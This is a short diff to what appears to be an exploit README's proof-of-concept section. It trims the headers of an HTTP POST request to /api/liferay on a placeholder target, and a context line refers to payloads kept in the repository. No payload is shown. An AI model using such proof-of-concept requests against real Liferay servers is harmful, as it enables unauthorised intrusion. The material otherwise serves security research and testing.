@@ -7,17 +7,11 @@ I already shared payloads in repo. You must find the right syntax by brute-force
 # Proof Of Concept
 
 POST /api/liferay HTTP/1.1
-
 Host: TARGET  
-
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9
 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
-
 Accept-Encoding: gzip, deflate
-
 Connection: close
 
 
